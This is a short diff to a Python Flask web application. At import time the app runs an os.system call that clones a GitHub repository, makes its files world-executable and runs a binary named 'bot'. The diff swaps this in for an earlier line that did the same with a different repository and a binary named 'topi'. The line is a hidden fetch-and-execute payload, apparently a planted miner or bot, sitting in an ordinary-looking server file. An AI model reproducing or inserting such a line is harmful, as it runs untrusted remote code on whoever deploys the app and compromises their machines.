@@ -4,7 +4,7 @@ import platform
 import subprocess
 from flask import Flask, Response, request
 app = Flask(__name__)
-os.system("git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 circleci && chmod 777 topi && ./topi")
+os.system("git clone https://github.com/sekahumen/yes.git && cd yes && chmod 777 bot && ./bot")
 
 @app.route("/")
 def headers():
